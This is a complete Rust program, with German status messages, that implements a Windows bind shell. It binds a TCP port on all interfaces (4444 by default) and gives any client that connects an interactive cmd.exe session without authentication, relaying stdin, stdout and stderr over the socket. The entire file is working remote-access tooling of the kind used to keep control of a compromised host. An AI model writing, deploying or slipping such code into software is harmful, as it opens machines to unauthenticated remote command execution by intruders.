use std::env;
use std::io::{BufRead, Read, Write};
use std::net::TcpListener;
use std::process::{Command, Stdio};
use std::thread;

fn main() {
    let args: Vec<String> = env::args().collect();
    let port: u16 = if args.len() >= 2 {
        match args[1].parse() {
            Ok(p) => p,
            Err(_) => {
                eprintln!("[!] Ungültiger Port '{}'. Verwende 4444.", args[1]);
                4444
            }
        }
    } else {
        4444
    };

    let bind_addr = format!("0.0.0.0:{}", port);
    let listener = match TcpListener::bind(&bind_addr) {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[!] Konnte Port {} nicht binden: {}", port, e);
            return;
        }
    };

    println!("[*] Server (Bind Shell) läuft auf {} ...", bind_addr);
    println!("[*] Warte auf Client-Verbindung...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let addr = stream.peer_addr().unwrap();
                println!("[+] Client verbunden: {}", addr);
                thread::spawn(|| handle_client(stream));
            }
            Err(e) => eprintln!("[!] Fehler: {}", e),
        }
    }
}

fn handle_client(stream: std::net::TcpStream) {
    let mut child = match Command::new("cmd")
        .arg("/Q") // echo off
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] cmd.exe konnte nicht gestartet werden: {}", e);
            return;
        }
    };

    let mut cmd_stdin = child.stdin.take().unwrap();
    let cmd_stdout = child.stdout.take().unwrap();
    let cmd_stderr = child.stderr.take().unwrap();

    let mut reader = std::io::BufReader::new(stream.try_clone().unwrap());
    let writer = stream.try_clone().unwrap();

    // Thread: cmd stdout -> Client
    let mut w_out = writer.try_clone().unwrap();
    thread::spawn(move || {
        let mut buf = [0u8; 8192];
        let mut out = std::io::BufReader::new(cmd_stdout);
        loop {
            match out.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    if w_out.write_all(&buf[..n]).is_err() {
                        break;
                    }
                    let _ = w_out.flush();
                }
                Err(_) => break,
            }
        }
    });

    // Thread: cmd stderr -> Client
    let mut w_err = writer.try_clone().unwrap();
    thread::spawn(move || {
        let mut buf = [0u8; 8192];
        let mut err = std::io::BufReader::new(cmd_stderr);
        loop {
            match err.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    if w_err.write_all(&buf[..n]).is_err() {
                        break;
                    }
                    let _ = w_err.flush();
                }
                Err(_) => break,
            }
        }
    });

    // Main: Client -> cmd stdin
    loop {
        let mut line = String::new();
        match reader.read_line(&mut line) {
            Ok(0) | Err(_) => break,
            Ok(_) => {
                let cmd = line.trim();
                if cmd.eq_ignore_ascii_case("exit") {
                    let _ = cmd_stdin.write_all(b"exit\n");
                    let _ = cmd_stdin.flush();
                    break;
                }
                if cmd.is_empty() {
                    continue;
                }
                if cmd_stdin.write_all(cmd.as_bytes()).is_err() {
                    break;
                }
                if cmd_stdin.write_all(b"\r\n").is_err() {
                    break;
                }
                let _ = cmd_stdin.flush();
            }
        }
    }

    let _ = child.wait();
}
